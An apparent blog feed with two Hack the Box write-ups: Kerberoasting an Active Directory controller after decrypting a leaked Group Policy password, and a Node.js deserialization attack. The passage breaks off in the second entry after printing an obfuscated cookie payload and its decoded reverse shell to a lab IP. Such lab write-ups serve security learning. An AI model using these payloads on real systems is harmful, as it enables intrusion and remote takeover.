<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat</title><link href="/" rel="alternate"></link><link href="feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2018-12-08T00:00:00-08:00</updated><entry><title>HTB - Active</title><link href="htb-active.html" rel="alternate"></link><published>2018-12-08T00:00:00-08:00</published><updated>2018-12-08T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:None,2018-12-08:htb-active.html</id><summary type="html">&lt;p&gt;Guide to Active from Hack the Box&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
&lt;p&gt;Active is a Windows Server 2008 R2 Active Directory Domain Controller from Hack the Box.
I thought is was pretty fun and had some good learning opportunities with it.&lt;/p&gt;
&lt;h2&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;We start every engagement by identifying the target (in this case 10.10.10.100) and running a port scan against it.&lt;/p&gt;
&lt;h4&gt;Nmap (curated to remove some extra Windows stuff)&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# nmap -v -sC -sV -oA nmap/active 10.10.10.100&lt;/span&gt;

PORT      STATE SERVICE       VERSION
&lt;span class="m"&gt;53&lt;/span&gt;/tcp    open  domain        Microsoft DNS &lt;span class="m"&gt;6&lt;/span&gt;.1.7600 &lt;span class="o"&gt;(&lt;/span&gt;1DB04001&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Windows Server &lt;span class="m"&gt;2008&lt;/span&gt; R2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; dns-nsid: 
&lt;span class="p"&gt;|&lt;/span&gt;_  bind.version: Microsoft DNS &lt;span class="m"&gt;6&lt;/span&gt;.1.7600 &lt;span class="o"&gt;(&lt;/span&gt;1DB04001&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;88&lt;/span&gt;/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class="o"&gt;(&lt;/span&gt;server time: &lt;span class="m"&gt;2018&lt;/span&gt;-07-29 &lt;span class="m"&gt;17&lt;/span&gt;:35:32Z&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;135&lt;/span&gt;/tcp   open  msrpc         Microsoft Windows RPC
&lt;span class="m"&gt;139&lt;/span&gt;/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
&lt;span class="m"&gt;389&lt;/span&gt;/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class="o"&gt;(&lt;/span&gt;Domain: active.htb, Site: Default-First-Site-Name&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;445&lt;/span&gt;/tcp   open  microsoft-ds?
&lt;span class="m"&gt;464&lt;/span&gt;/tcp   open  kpasswd5?
&lt;span class="m"&gt;593&lt;/span&gt;/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP &lt;span class="m"&gt;1&lt;/span&gt;.0
&lt;span class="m"&gt;636&lt;/span&gt;/tcp   open  tcpwrapped
&lt;span class="m"&gt;3268&lt;/span&gt;/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class="o"&gt;(&lt;/span&gt;Domain: active.htb, Site: Default-First-Site-Name&lt;span class="o"&gt;)&lt;/span&gt;

Service Info: Host: DC&lt;span class="p"&gt;;&lt;/span&gt; OS: Windows&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows_server_2008:r2, cpe:/o:microsoft:windows

Host script results:
&lt;span class="p"&gt;|&lt;/span&gt; nbstat: NetBIOS name: DC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &lt;span class="m"&gt;00&lt;/span&gt;:50:56:b9:11:3f &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; Names:
&lt;span class="p"&gt;|&lt;/span&gt;   DC&amp;lt;&lt;span class="m"&gt;00&lt;/span&gt;&amp;gt;               Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
&lt;span class="p"&gt;|&lt;/span&gt;   ACTIVE&amp;lt;&lt;span class="m"&gt;00&lt;/span&gt;&amp;gt;           Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
&lt;span class="p"&gt;|&lt;/span&gt;   ACTIVE&amp;lt;1c&amp;gt;           Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
&lt;span class="p"&gt;|&lt;/span&gt;   DC&amp;lt;&lt;span class="m"&gt;20&lt;/span&gt;&amp;gt;               Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
&lt;span class="p"&gt;|&lt;/span&gt;_  ACTIVE&amp;lt;1b&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Active appears to be a Windows 2008 R2 Active Directory Domain Controller for the &lt;strong&gt;&lt;code&gt;ACTIVE.HTB&lt;/code&gt;&lt;/strong&gt; domain.
Since this is a Windows computer, we should see if any shares are available to us from a null session.&lt;/p&gt;
&lt;h2&gt;Getting User&lt;/h2&gt;
&lt;h4&gt;SMBMap&lt;/h4&gt;
&lt;p&gt;&lt;img alt="smbmap-shares" src="/images/ctf/htb/active/smbmap-shares.jpg" title="Running smbmap to enumerate shares"&gt;&lt;/p&gt;
&lt;p&gt;Active does allow null sessions to connect to the Replication share.
Enumerating further:&lt;/p&gt;
&lt;p&gt;&lt;img alt="smbmap-groups" src="/images/ctf/htb/active/smbmap-groups.jpg" title="Enumerating the files in Replication"&gt;&lt;/p&gt;
&lt;p&gt;According to &lt;a href="https://adsecurity.org/?p=2288"&gt;adsecurity&lt;/a&gt;, Groups.xml is a file that is distributed via Group Policy that can (among other things) create local users, set scheduled tasks, and change the local Administrator password.
It may have very useful information.&lt;/p&gt;
&lt;p&gt;It is possible to download the file using smbmap by setting the &lt;code&gt;--download&lt;/code&gt; flag followed by the full path to the file, in this case &lt;strong&gt;&lt;code&gt;Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;After downloading the file, we can view the contents (which I have formatted for easy reading):&lt;/p&gt;
&lt;h4&gt;Groups.xml&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class="na"&gt;clsid=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;User&lt;/span&gt; &lt;span class="na"&gt;clsid=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;active.htb\SVC_TGS&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;image=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;changed=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2018-07-18 20:46:06&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;uid=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;Properties&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;U&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;newName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;fullName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;description=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;cpassword=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;changeLogon=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;noChange=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;neverExpires=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;acctDisabled=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;userName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;active.htb\SVC_TGS&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/User&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Based on the &lt;strong&gt;&lt;code&gt;Groups&lt;/code&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;code&gt;User&lt;/code&gt;&lt;/strong&gt; tags, this is modifying or distributing an account named &lt;strong&gt;active.htb\SVC_TGS&lt;/strong&gt;, which is clearly a domain joined user.
Under &lt;strong&gt;&lt;code&gt;Properties&lt;/code&gt;&lt;/strong&gt;, the &lt;strong&gt;&lt;code&gt;cpassword&lt;/code&gt;&lt;/strong&gt; tag holds a password encrypted by an AES-256 private key.&lt;/p&gt;
&lt;p&gt;This would be a problem, if &lt;a href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx"&gt;Microsoft hadn't released the 32-byte key&lt;/a&gt; sometime before 2012.&lt;/p&gt;
&lt;p&gt;Kali comes with the &lt;code&gt;gpp-decrypt&lt;/code&gt; utility, which is built specifically for this task.
Running it on the encrypted password reveals the user account's password in plaintext.&lt;/p&gt;
&lt;p&gt;&lt;img alt="gpp-decrypt" src="/images/ctf/htb/active/gpp-decrypt.jpg" title="This is why we do the hash"&gt;&lt;/p&gt;
&lt;p&gt;So the password for SVC_TGS is &lt;strong&gt;GPPStillStandingStrong2k18&lt;/strong&gt;.
To test the credentials, we can run any utility that authenticates against AD, such as Impacket's &lt;code&gt;GetADUsers.py&lt;/code&gt; script.&lt;/p&gt;
&lt;h4&gt;GetADUsers.py&lt;/h4&gt;
&lt;p&gt;&lt;img alt="GetADUsers" src="/images/ctf/htb/active/GetADUsers.jpg" title="The normal stuff, mostly"&gt;&lt;/p&gt;
&lt;p&gt;The credentials we have are valid, and Administrator appears to be the only account to target at the moment.
We can attempt to run &lt;code&gt;psexec.py&lt;/code&gt; (Also Impacket) on the target to get a shell, but the account doesn't seem to have write access to any shares.&lt;/p&gt;
&lt;h4&gt;psexec.py (no shell)&lt;/h4&gt;
&lt;p&gt;&lt;img alt="psexec-user" src="/images/ctf/htb/active/psexec-user.jpg" title="No shell just yet"&gt;&lt;/p&gt;
&lt;p&gt;What we can do is access the &lt;strong&gt;&lt;code&gt;Users&lt;/code&gt;&lt;/strong&gt; share and read from the user's home directory and get the user flag in &lt;strong&gt;&lt;code&gt;Users\SVC_TGS\Desktop&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="user-flag" src="/images/ctf/htb/active/user-flag.jpg" title="One down, one to go!"&gt;&lt;/p&gt;
&lt;h2&gt;Getting Administrator&lt;/h2&gt;
&lt;p&gt;While searching for methods to escalate out privileges, it's likely that we would run Impacket's &lt;code&gt;GetUserSPNs.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="GetUserSPNs" src="/images/ctf/htb/active/kerberoast-stage1.jpg" title="I think it's Sunday"&gt;&lt;/p&gt;
&lt;p&gt;It appears that a CIFS service is running on the Administrator account.
We may be able to perform a &lt;a href="https://attack.mitre.org/techniques/T1208/"&gt;Kerberoast&lt;/a&gt; attack on the service and gain access to the Administrator account.&lt;/p&gt;
&lt;p&gt;There are plenty of excellent guides on what Kerberoasting is and how it works, so I will &lt;a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf"&gt;provide&lt;/a&gt; &lt;a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/"&gt;some&lt;/a&gt; &lt;a href="https://pentestlab.blog/2018/06/12/kerberoast/"&gt;resources&lt;/a&gt; and keep my own explanation brief.&lt;/p&gt;
&lt;p&gt;Since the Administrator account is running a service (CIFS) on the machine, it has a SPN set on the account.
Since we possess the ability to obtain a valid Kerberos TGT ticket, we may request a Kerberos TGS service ticket for any SPN from any domain controller we can authenticate to.
Parts of the TGS we obtain will be encrypted with the password hash of the service account (in this case Administrator), meaning that we can brute force the credentials offline without ever knowing the actual password hash of the account.&lt;/p&gt;
&lt;h2&gt;Sunday Dinner, aka How I Kerberoasted Your Domain and You're Gonna Like It&lt;/h2&gt;
&lt;p&gt;To perform the attack from a non-domain joined computer, the easiest method is to use &lt;code&gt;GetUserSPNs.py&lt;/code&gt; to view any &lt;s&gt;beef roasts&lt;/s&gt; SPN's we fancy (repeat image for continuity purposes):&lt;/p&gt;
&lt;p&gt;&lt;img alt="Kerberoast-stage1" src="/images/ctf/htb/active/kerberoast-stage1.jpg" title="Ensure you get a good chuck of 'meat'"&gt;&lt;/p&gt;
&lt;p&gt;If there are SPN's we like the looks of (such as that CIFS on Administrator), we simply add the &lt;code&gt;-request&lt;/code&gt; flag and execute again: &lt;/p&gt;
&lt;p&gt;&lt;img alt="Kerberoast-stage2" src="/images/ctf/htb/active/kerberoast-stage2.jpg" title="Prepare the dish for the 'oven'"&gt;&lt;/p&gt;
&lt;p&gt;Finally, take your silver ticket and throw it into your &lt;s&gt;oven&lt;/s&gt; cracking program of choice.
I use hashcat.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Kerberoast-stage3" src="/images/ctf/htb/active/kerberoast-stage3.jpg" title="Leave for 1-10 seconds, depending on GPU"&gt;&lt;/p&gt;
&lt;p&gt;Now that we have access to the Administrator account, we can use &lt;code&gt;psexec.py&lt;/code&gt; successfully to obtain a shell on the target system.&lt;/p&gt;
&lt;p&gt;&lt;img alt="roasted" src="/images/ctf/htb/active/roasted.jpg" title="Roasted to system, no less"&gt;&lt;/p&gt;
&lt;p&gt;This concludes the guide of Active from Hack the Box.&lt;/p&gt;</content><category term="ctf"></category><category term="hack the box"></category></entry><entry><title>HTB - Celestial</title><link href="htb-celestial.html" rel="alternate"></link><published>2018-12-04T00:00:00-08:00</published><updated>2018-12-04T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:None,2018-12-04:htb-celestial.html</id><summary type="html">&lt;p&gt;Guide to Celestial from Hack the Box&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Preamble&lt;/h2&gt;
&lt;p&gt;The original writeup I did for this was some time ago.
My methodology then didn't include nearly as many images, and the box has been retired since August 2018.
If I had the option to redo this with better notes and images to create a better product here, I absolutley would.&lt;/p&gt;
&lt;h2&gt;Description&lt;/h2&gt;
&lt;p&gt;The attack path for Celestial involves a deserialization attack against the hosted Node.js Express server, followed by some automated script hijacking.&lt;/p&gt;
&lt;p&gt;Celestial's lab IP is 10.10.10.85.&lt;/p&gt;
&lt;h2&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;The first thing I did was perform a scan of the host to determine what services were open, finding that only HTTP on port 3000 was available, which appeared to be a Node.js Express application.&lt;/p&gt;
&lt;p&gt;Investigating the web page, the first thing display was a 404 error, but reloading the webpage revealed a different response, with the text &lt;strong&gt;Hey Dummy, 2 + 2 = 22&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Proxying my traffic through Burp suite revealed a base64 encoded cookie, with attributes including &lt;strong&gt;username&lt;/strong&gt;, &lt;strong&gt;country&lt;/strong&gt;, &lt;strong&gt;city&lt;/strong&gt;, and &lt;strong&gt;num&lt;/strong&gt;.
Some research revealed that this Node.js application may be susceptible to a deserialization attack.&lt;/p&gt;
&lt;p&gt;After some experimentation, I successfully generated a payload that would exploit the vulnerability.&lt;/p&gt;
&lt;h4&gt;Poisoned cookie, from Base64 with encoded JS shellcode&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;username&amp;quot;:&amp;quot;Dummy&amp;quot;,&amp;quot;rce&amp;quot;:&amp;quot;_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,48,54,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,10,32,32,32,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,10,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,10,32,32,32,32,125,59,10,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10)) ;\n }()&amp;quot;}
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;JS shellcode, decoded from Base10 CharCode&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;net&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;net&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;spawn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;child_process&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.10.14.106&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1337&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;TIMEOUT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;5000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;contains&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;undefined&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;contains&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;it&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;indexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;it&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;net&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Socket&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;sh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,[]);&lt;/span&gt;
        &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Connected!\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;pipe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;pipe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;pipe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
          &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;end&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Disconnected!\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;error&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nx"&gt;TIMEOUT&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
